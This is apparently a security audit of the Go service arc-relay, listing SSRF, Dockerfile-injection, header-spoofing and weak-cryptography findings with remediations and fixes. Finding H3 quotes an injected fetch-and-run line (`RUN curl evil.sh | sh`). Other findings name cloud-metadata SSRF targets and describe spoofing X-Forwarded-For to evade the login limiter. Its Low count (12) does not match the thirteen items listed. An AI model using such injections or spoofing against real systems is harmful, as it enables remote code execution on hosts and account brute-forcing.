# Arc Relay Security Audit - Foot-Gun Finder

Scope: Go codebase at `github.com/comma-compliance/arc-relay`.
Methodology: Static review across `internal/{store,server,web,oauth,proxy,docker,middleware,config}`, `cmd/arc-relay`, and `migrations/` against a checklist of common Go web-service anti-patterns.

**High-level result:** No Critical findings. Several High findings concentrated in admin-configurable outbound HTTP targets (SSRF) and Dockerfile generation (injection via build fields). SQL access is uniformly parameterized, API-key/CSRF/PKCE comparisons are constant-time, TLS uses defaults, and Docker containers are launched without privilege escalation.

This report is paired with minimal in-scope fixes landed in the same PR. See "Fixes applied" at the bottom.

---

## Findings summary

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 5 |
| Medium | 9 |
| Low | 12 |
| Informational | 15 |

---

## Critical

None.

## High

### H1. SSRF in alerter webhook URL (admin-configured, no validation)
- Location: `internal/middleware/alerter.go:179-199` (`sendWebhook`); config at lines 22-30; constructor `NewAlerter` line 82.
- Description: `AlertRule.WebhookURL` is POSTed with sensitive MCP request context (method, tool, user, server) with no scheme/host checks. Any `http://169.254.169.254/...`, `http://127.0.0.1:...`, or internal URL is accepted.
- Severity: High (SSRF + data exfiltration; admin-configured, but compromised/tricked-admin flows amplify).
- Remediation: Apply `validateExternalURL` (https-only, private-IP-resolved blocklist) before POST. Swap to a client backed by `ssrfSafeDialContext` so DNS rebinding at dial time is blocked.
- Status: **Fixed in this PR** (pre-POST URL validation added).

### H2. SSRF via OAuth discovery-returned token/authorization endpoints
- Location: `internal/oauth/oauth.go:445-448` (`doRefreshToken` rediscover path) and `internal/web/handlers.go:2832-2850` (`handleServerCreate`/update). Token POSTs at `internal/oauth/oauth.go:490-498` use `http.DefaultClient` (no SSRF guard).
- Description: `validateExternalURL` is applied to remote server URL and registration endpoint, but not to `authorization_endpoint`/`token_endpoint` fields from `.well-known/oauth-authorization-server`. A malicious discovery document could redirect token POSTs (including access/refresh tokens) to an internal URL.
- Severity: High (discovery-driven SSRF; leaks tokens).
- Remediation: Run `validateExternalURL` on `AuthURL` and `TokenURL` before persisting. Swap `http.DefaultClient` for the hardened client in `internal/oauth/discovery.go`.
- Status: **Fixed in this PR** (validation at discovery + re-discovery sites; token requests now use `discoveryClient`).

### H3. Dockerfile/command injection via `build_package` / `build_version` / `build_dockerfile` / `build_git_url`
- Location: template definitions `internal/docker/manager.go:400-421`; Dockerfile generation `internal/docker/manager.go:431-462`; form parsing (no validation beyond `TrimSpace`) `internal/web/handlers.go:2762-2789`.
- Description: `build_package`, `build_version`, `build_git_url`, and `build_dockerfile` are rendered via `text/template` directly into `RUN pip install --no-cache-dir {{.Package}}...`, `RUN git clone {{.GitURL}} /app`, etc. Newlines and shell metacharacters survive, letting an admin inject arbitrary Dockerfile directives (including `RUN curl evil.sh | sh` or `VOLUME /`) that execute on the Docker host at build time.
- Severity: High (host-level RCE on the relay's Docker host; crosses web-admin → docker-host trust boundary).
- Remediation: Before saving/building, reject `\n`, `\r`, whitespace, and characters outside a package/semver allowlist in `build_package`/`build_version`. Run the existing `validateGitURL` at save time and extend it to reject shell metachars. Document that `build_dockerfile` is privileged input; consider feature-flagging for multi-tenant installs.
- Status: Reported; not fixed in this PR (requires a UX-visible validation pass).

### H4. `validateServerURL` permits private/loopback hosts for HTTP/remote MCP backends
- Location: `internal/web/handlers.go:3122-3135`, used at `:2798` and `:2816`.
- Description: Admin can point MCP backends at any `http://10.x.x.x` or `http://169.254.169.254`. Proxy then fetches via plain `http.Client{}` in `internal/proxy/http_proxy.go` / `remote_proxy.go`. Non-admin API-key callers with profile access can coerce the proxy into hitting internal endpoints.
- Severity: High when the relay is exposed to non-admin callers. Medium for single-admin deployments.
- Remediation: Opt-in "intranet URL" flag defaulting off; or bind proxy clients to `ssrfSafeDialContext` and refuse to dial private IPs unless explicitly allowlisted.
- Status: Reported; deferred - touches the proxy hot path.

### H5. `X-Forwarded-For` trusted blindly - login rate-limit bypass
- Location: `internal/web/handlers.go:367-377` (`clientIP`).
- Description: The 5-attempts/15-min login limiter keys on the first `X-Forwarded-For` hop with no trusted-proxy configuration. A direct attacker rotating `X-Forwarded-For: <random>` on each POST trivially bypasses the lockout. Same spoofed value lands in security logs.
- Severity: High (brute-force protection defeated on internet-exposed deployments).
- Remediation: Only honor `X-Forwarded-For` when `RemoteAddr` is in a configurable trusted-proxy CIDR set (e.g. `ARC_RELAY_TRUSTED_PROXIES`). Otherwise use `RemoteAddr`.
- Status: Reported; not fixed in this PR (needs config surface and deployment doc updates).

---

## Medium

### M1. Session cookie `Secure` flag depends on `PublicBaseURL` starting with `https`
- Location: `internal/web/handlers.go:470-478`, `:1925-1933`, `:2017-...`.
- Description: Correct when `ARC_RELAY_BASE_URL` is set; otherwise cookies may be sent over HTTP behind a TLS-terminating proxy.
- Remediation: Consider `X-Forwarded-Proto: https` as a secondary signal or startup warning when bound non-loopback without `PublicBaseURL()` set to https.

### M2. OAuth authorize POST re-reads `code_challenge` from form body
- Location: `internal/web/oauth_provider.go:289-319`.
- Description: CSRF + session-bound consent is correct, but `code_challenge` is taken from the POST body instead of a server-bound authorization request record. PKCE-S256 still protects the exchange; cleaner design is to persist the authorize request server-side keyed by consent nonce.
- Remediation: Persist authorize params server-side, verify on POST.

### M3. Weak KDF: `sha256(passphrase)` -> AES-GCM key
- Location: `internal/store/crypto.go:25-42`.
- Description: Fine when operators use high-entropy (32-byte hex) keys. Low-entropy passphrases are brute-forceable offline if the DB is exfiltrated.
- Remediation: Switch to argon2id/scrypt with a per-install salt, or refuse startup on keys shorter than 32 bytes. Document the required key strength.

### M4. Session IDs stored raw (no hash) in DB
- Location: `internal/store/sessions.go:17-23`; lookup `:27-43`.
- Description: An attacker with DB read can hijack active sessions. API keys and OAuth tokens are correctly stored as SHA-256 hashes; sessions are not.
- Remediation: Store `sha256(sessionID)`; keep the raw value only in the cookie.

### M5. Error responses echo internal text to clients
- Locations: e.g. `internal/server/http.go:362,364,626,821,840,856,970`; `internal/web/handlers.go:2495,2519,2536,1998`.
- Description: Stack-trace-class or DB-driver text returned to callers. Unauthenticated paths (OAuth callback, invite) are directly attacker-facing.
- Remediation: Log detail server-side (`slog.Error`), return generic message to clients.

### M6. `text/template` used to render Dockerfiles with unescaped input (root cause of H3)
- Location: `internal/docker/manager.go:16, 400-462`.
- Description: `text/template` does no shell/Dockerfile escaping. Rendering admin input requires explicit allowlist validation at the template boundary.
- Remediation: Regex-validate fields (`^[A-Za-z0-9._\-+/@]+$` etc.) before `tmpl.Execute`.

### M7. Archive middleware target URL has no host allowlist or SSRF dial guard
- Location: `internal/middleware/archive.go:102-149` (`ValidateArchiveConfig`); dispatcher `archive_dispatcher.go:248-305`, client `:66-71`.
- Description: HTTPS URLs accepted to any host; full MCP request+response bodies are sent. DNS rebinding not prevented.
- Remediation: Env-configured allowlist or plug in `ssrfSafeDialContext`.

### M8. `validateServerURL` accepts plaintext `http://` for any host
- Location: `internal/web/handlers.go:3122-3135`.
- Description: Bearer tokens can flow over plaintext. Pairs with H4.
- Remediation: Default to https; permit http only for validated loopback hosts.

### M9. Invite + device-auth endpoints unauthenticated and unrate-limited
- Location: `internal/web/handlers.go:334-335` (`/api/auth/invite`, `/invite/`), device-auth `:329-331`.
- Description: No brute-force protection; enables polling and user-enumeration.
- Remediation: Reuse the login rate limiter pattern per IP.

---

## Low

### L1. `SameSite=Lax` on session cookie (not Strict)
- Location: `internal/web/handlers.go:477,1932,2020`. State-changing endpoints are CSRF-protected, so Lax is acceptable. Consider Strict for pure admin deployments.

### L2. OAuth callback echoes provider-supplied `error`/`error_description`
- Location: `internal/web/handlers.go:2517-2523`. `http.Error` sets `text/plain`, so no XSS risk, but unbounded length/charset.
- Remediation: Truncate + strip control chars, or show generic error + log detail.

### L3. Redirect-URI exact-match is spec-compliant but unforgiving
- Location: `internal/store/oauth_clients.go:24-31`. Informational.

### L4. `GitURL` concatenated into `RUN git clone` (only validated for scheme/host)
- Location: `internal/docker/manager.go:411,417`. Shell metachars in URL path can survive `url.Parse`.
- Remediation: Extend `validateGitURL` to reject `[\s` `;&|<>\n$`].

### L5. `#nosec G122 G304` on tar `os.Open` - verified OK but note for future edits
- Location: `internal/docker/manager.go:575`.

### L6. `fmt.Sprintf` used to compose error JSON
- Location: `internal/server/http.go:252,258,626,821,840,856`. Use `json.NewEncoder` consistently.

### L7. Refresh grant permits missing `client_id`
- Location: `internal/web/oauth_provider.go:574-627`. Per spec public clients must include it. Enforce.

### L8. `VACUUM INTO` builds path via `fmt.Sprintf` (path is server-local, not user input)
- Location: `internal/store/db.go:106`. Informational.

### L9. `handleMiddlewareAction` trusts `target=global` as discriminator
- Location: `internal/web/handlers.go:1364-1372,1437-1505`. Admin-only; add a regression test.

### L10. No guard against admin self-delete or last-admin-delete
- Location: `internal/web/handlers.go:1660-1662`. Availability risk.

### L11. Logout does not offer "log out everywhere"
- Location: `internal/web/handlers.go:494-499`. Low; password change already calls `DeleteByUser`.

### L12. CSP allows `'unsafe-inline'` for scripts and styles
- Location: `internal/server/http.go:174`. Templates are html/template-escaped, but CSP is weakened.
- Remediation: Extract inline scripts or adopt CSP nonces.

### L13. DCR `http://` loopback check is case-sensitive (`localhost` vs `Localhost`)
- Location: `internal/web/oauth_provider.go:239`.
- Status: **Fixed in this PR** (switched to `strings.EqualFold`).

---

## Informational / verified safe

| # | Item | Location |
|---|---|---|
| I1 | API key validation uses `subtle.ConstantTimeCompare` | `internal/store/users.go:303-344` |
| I2 | PKCE verifier compared via `subtle.ConstantTimeCompare` | `internal/web/oauth_provider.go:541-545` |
| I3 | CSRF compared via `hmac.Equal` | `internal/web/handlers.go:364` |
| I4 | OAuth discovery uses SSRF-safe dialer | `internal/oauth/discovery.go:33-78` |
| I5 | DB backup paths local-only | `internal/store/db.go:90-122` |
| I6 | No `crypto/md5`, `crypto/sha1`, `crypto/des`, or `math/rand` in security paths | - |
| I7 | No `InsecureSkipVerify` / custom `VerifyPeerCertificate` / low `MinVersion` | - |
| I8 | No `archive/zip` decompression of untrusted archives | - |
| I9 | SQL queries uniformly parameterized with `?` | `internal/store/*.go` |
| I10 | Sanitizer regex is RE2 - no catastrophic backtracking | `internal/middleware/sanitizer.go:66` |
| I11 | Containers launched without `Privileged`, `CapAdd`, host mounts, or `docker.sock` exposure | `internal/docker/manager.go:135-206` |
| I12 | Login rotates session ID post-auth (no fixation) | `internal/web/handlers.go:458-478` |
| I13 | OAuth refresh tokens rotated (single-use) | `internal/store/oauth_clients.go:112-133` |
| I14 | OAuth code single-use + 5-min TTL + PKCE-S256 required | `internal/web/oauth_provider.go:500-572` |
| I15 | OAuth authorize re-validates `redirect_uri` server-side | `internal/web/oauth_provider.go` |

---

## Fixes applied in this PR

1. **H1** - `internal/middleware/alerter.go`: validate webhook URL (https + non-private IP) before each POST; drop the alert and log a warning when validation fails.
2. **H2** - `internal/web/handlers.go` (`handleCatalogDiscoverOAuth` + `buildServerFromForm`): run `validateExternalURL` against the discovered `AuthURL` and `TokenURL` before persisting. If either fails, treat discovery as unusable.
3. **H2** - `internal/oauth/oauth.go` (`tokenRequest`, re-discovery path): route token POSTs and re-discovered endpoint validation through the SSRF-safe `discoveryClient` already defined in `internal/oauth/discovery.go`. Guard the re-discovery `TokenURL`/`AuthURL` overwrite behind `validateExternalURL`.
4. **L13** - `internal/web/oauth_provider.go`: use `strings.EqualFold` when checking localhost hostnames in DCR redirect-URI validation.

## Not fixed (tracked for follow-up)

- **H3** Dockerfile/build-field injection - needs a validation helper and UX-visible error surface.
- **H4/M8** MCP backend URL hardening - opt-in intranet flag + client SSRF guard touches the proxy path.
- **H5** Trusted-proxy gate for `X-Forwarded-For` - requires new config surface (`ARC_RELAY_TRUSTED_PROXIES`) and deployment docs.
- **M1-M9, L1-L12** - see individual remediation notes above.
